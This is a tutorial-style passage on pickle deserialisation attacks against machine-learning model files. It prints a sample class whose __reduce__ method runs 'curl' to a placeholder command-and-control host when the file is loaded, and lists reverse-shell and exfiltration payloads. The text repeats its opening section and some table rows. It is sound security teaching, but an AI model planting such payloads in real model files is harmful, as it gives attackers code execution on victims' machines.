## Serilisation 

Think of serialisation like packing a suitcase. You have a complex Python object in memory: a trained model with millions of parameters and configuration settings. **Serialisation** converts that into a file on disk. **Deserialisation** is the reverse: unpacking the file back into a usable Python object.

Machine learning frameworks like PyTorch and scikit-learn use serialisation to save trained models so they can be loaded later without retraining.

Here is a simple example of saving and loading a model with pickle:

    import pickle
    # Serialise (save) a model to a file
    model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
    with open("model.pkl", "wb") as f:
        pickle.dump(model, f)

    # Deserialise (load) the model back
    with open("model.pkl", "rb") as f:
        loaded_model = pickle.load(f)


This looks harmless. The problem is in how pickle handles custom objects.

#### The __reduce__ Method

When pickle saves a custom Python object, it calls a special method called __reduce__. This method returns instructions for reconstructing the object later. Python follows those instructions automatically when you callpickle.load(), with no prompts and no warnings.

Here is the problem: __reduce__ can tell Python to call any function with any arguments. Pickle does not check or restrict what gets called. An attacker can craft an object where those reconstruction instructions are actually a system command, and Python will run it silently when the file is loaded.

## 01 — Understanding Serialization

### What is Serilisation ?

Think of serialisation like packing a suitcase. You have a complex Python object in memory: a trained model with millions of parameters and configuration settings. **Serialisation** converts that into a file on disk. **Deserialisation** is the reverse: unpacking the file back into a usable Python object.

Machine learning frameworks like PyTorch and scikit-learn use serialisation to save trained models so they can be loaded later without retraining.

Here is a simple example of saving and loading a model with pickle:

    import pickle
    # Serialise (save) a model to a file
    model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
    with open("model.pkl", "wb") as f:
        pickle.dump(model, f)

    # Deserialise (load) the model back
    with open("model.pkl", "rb") as f:
        loaded_model = pickle.load(f)


This looks harmless. The problem is in how pickle handles custom objects.

#### The __reduce__ Method

When pickle saves a custom Python object, it calls a special method called __reduce__. This method returns instructions for reconstructing the object later. Python follows those instructions automatically when you callpickle.load(), with no prompts and no warnings.

Here is the problem: __reduce__ can tell Python to call any function with any arguments. Pickle does not check or restrict what gets called. An attacker can craft an object where those reconstruction instructions are actually a system command, and Python will run it silently when the file is loaded.

### A Malicious Example

This file looks like a model. When loaded, it silently makes an outbound network connection to the attacker's server:

    import pickle
    import os

    class MaliciousModel:
        def __reduce__(self):
            # pickle.load() will call os.system() with this command
            return (os.system, ("curl http://c2.example.com/beacon",))

    with open("backdoored_model.pkl", "wb") as f:
        pickle.dump(MaliciousModel(), f)

The victim calls pickle.load() expecting model weights. Python calls os.system() instead, running curl to ping the attacker's server in the background. The same happens with torch.load() since PyTorch uses pickle internally.

**A useful analogy** would be to imagine you receive a Word document. You expect text. Instead, it silently installs malware. A malicious pickle file does exactly the same thing: it disguises executable code as data.


### What Attackers Can Do

The payload is not limited to a single action or ping. Depending on the server environment, an attacker can execute these payloads:

| Payload       | Impact |
| :---          |    :----:   |
| Reverse shell | Full Remote Access to victims machine     |
| Data exfilteration    | Steal sensitive files such as credentials or source code |
| Crypto miner | Uses the victim's computer resources to mine cryptocurrency   |
| Reconnaissance | Maps usernames, hostnames, and running processes |

| Data exfilteration    | Steal sensitive files such as credentials or source code |
| Crypto miner | Uses the victim's computer resources to mine cryptocurrency   |
| Reconnaissance | Maps usernames, hostnames, and running processes |

